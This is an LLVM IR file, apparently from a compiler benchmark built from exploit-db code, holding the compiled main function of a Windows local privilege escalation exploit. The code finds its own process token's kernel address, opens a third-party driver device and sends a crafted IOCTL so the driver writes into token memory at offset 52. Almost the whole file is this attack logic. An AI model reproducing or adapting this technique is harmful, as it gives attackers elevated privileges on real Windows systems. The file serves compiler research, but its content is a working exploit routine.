; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_38533.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_38533.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@TOKEN_QUERY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [51 x i8] c"\\\\.\\WTCAP_A_{B8296C9f-8ed4-48A2-84A0-A19DB94418E3}\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@FILE_ATTRIBUTE_NORMAL = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i8] c" Open Driver OK\0A\00", align 1
@SL_IOCTL_GET_EVENT_NAME = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [22 x i8] c"send IOCTL error %d.\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c" Send IOCTL OK\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c" Open Driver error %d.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = call i32 (...) @GetCurrentProcess()
  %7 = load i32, i32* @TOKEN_QUERY, align 4
  %8 = call i32 @OpenProcessToken(i32 %6, i32 %7, i64* %3)
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %12, label %10

10:                                               ; preds = %0
  %11 = call i32 (...) @DebugBreak()
  br label %12

12:                                               ; preds = %10, %0
  %13 = call i32 (...) @GetCurrentProcessId()
  %14 = call i8* @FindTokenAddressHandles(i32 %13)
  store i8* %14, i8** %4, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i32 @CloseHandle(i64 %15)
  %17 = load i32, i32* @GENERIC_READ, align 4
  %18 = load i32, i32* @GENERIC_WRITE, align 4
  %19 = or i32 %17, %18
  %20 = load i32, i32* @OPEN_EXISTING, align 4
  %21 = load i32, i32* @FILE_ATTRIBUTE_NORMAL, align 4
  %22 = call i64 @CreateFileA(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str, i64 0, i64 0), i32 %19, i32 0, i32* null, i32 %20, i32 %21, i32* null)
  store i64 %22, i64* %5, align 8
  %23 = load i64, i64* %5, align 8
  %24 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %25 = icmp ne i64 %23, %24
  br i1 %25, label %26, label %43

26:                                               ; preds = %12
  %27 = load i32, i32* @stderr, align 4
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %29 = load i64, i64* %5, align 8
  %30 = load i32, i32* @SL_IOCTL_GET_EVENT_NAME, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 52
  %33 = call i32 @DeviceIoControl(i64 %29, i32 %30, i32* null, i32 128, i8* %32, i32* null, i32* %1, i32* null)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %39, label %35

35:                                               ; preds = %26
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 (...) @GetLastError()
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i32 %37)
  br label %51

39:                                               ; preds = %26
  %40 = load i32, i32* @stderr, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %40, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  br label %42

42:                                               ; preds = %39
  br label %47

43:                                               ; preds = %12
  %44 = load i32, i32* @stderr, align 4
  %45 = call i32 (...) @GetLastError()
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %44, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i32 %45)
  br label %51

47:                                               ; preds = %42
  %48 = load i64, i64* %5, align 8
  %49 = call i32 @CloseHandle(i64 %48)
  %50 = call i32 (...) @getchar()
  br label %51

51:                                               ; preds = %47, %43, %35
  ret void
}

declare dso_local i32 @OpenProcessToken(i32, i32, i64*) #1

declare dso_local i32 @GetCurrentProcess(...) #1

declare dso_local i32 @DebugBreak(...) #1

declare dso_local i8* @FindTokenAddressHandles(i32) #1

declare dso_local i32 @GetCurrentProcessId(...) #1

declare dso_local i32 @CloseHandle(i64) #1

declare dso_local i64 @CreateFileA(i8*, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i8*, i32*, i32*, i32*) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @getchar(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
